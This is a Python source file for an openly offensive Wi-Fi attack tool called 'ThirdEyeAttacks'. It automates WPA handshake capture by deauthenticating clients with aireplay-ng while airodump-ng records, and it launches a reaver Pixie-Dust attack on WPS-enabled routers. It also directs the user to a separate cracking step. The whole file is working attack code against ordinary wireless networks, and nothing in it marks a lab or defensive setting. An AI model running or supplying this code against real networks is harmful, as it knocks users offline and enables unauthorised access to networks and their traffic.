import os
import subprocess
import time
import signal
from colorama import Fore

class ThirdEyeAttacks:
    def __init__(self, interface):
        self.interface = interface
        # Termux detection for sudo handling
        self.is_termux = os.path.exists("/data/data/com.termux")

    def run_cmd(self, cmd_list):
        """Helper to run commands with or without sudo based on environment."""
        if not self.is_termux:
            if cmd_list[0] != "sudo":
                cmd_list.insert(0, "sudo")
        return cmd_list

    def handshake_capture(self, bssid, channel, essid):
        """Captures WPA handshake by deauthenticating clients."""
        if not os.path.exists("captures"): 
            os.makedirs("captures")
            
        # Clean ESSID for filename (removing spaces/special chars)
        clean_essid = "".join(x for x in essid if x.isalnum() or x in "._-")
        out = f"captures/{clean_essid}"
        
        print(Fore.CYAN + f"\n[*] Target: {essid} ({bssid}) on CH {channel}")
        
        # 1. Start Sniffing
        sniff_cmd = self.run_cmd(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", out, self.interface])
        sniff = subprocess.Popen(sniff_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(Fore.YELLOW + "[*] Monitoring for Handshake...")
        time.sleep(5) # Let airodump settle
        
        # 2. Deauth Attack
        print(Fore.RED + "[!] Sending Deauth packets to force reconnection...")
        deauth_cmd = self.run_cmd(["aireplay-ng", "--deauth", "20", "-a", bssid, self.interface])
        subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL)
        
        # 3. Wait for capture
        print(Fore.WHITE + "[*] Waiting 15s for handshake to be captured...")
        try:
            time.sleep(15)
        except KeyboardInterrupt:
            pass
            
        # 4. Cleanup
        os.kill(sniff.pid, signal.SIGTERM)
        print(Fore.GREEN + f"[+] Session finished. File: {out}-01.cap")
        print(Fore.BLUE + "[*] Tip: Use Option 4 to crack this file.")

    def wps_pixie(self, bssid):
        """Runs the Pixie-Dust attack for WPS-enabled routers."""
        print(Fore.MAGENTA + f"\n[*] Launching Pixie-Dust attack on {bssid}...")
        pixie_cmd = self.run_cmd(["reaver", "-i", self.interface, "-b", bssid, "-K", "1", "-vv"])
        try:
            subprocess.run(pixie_cmd)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Attack stopped by user.")
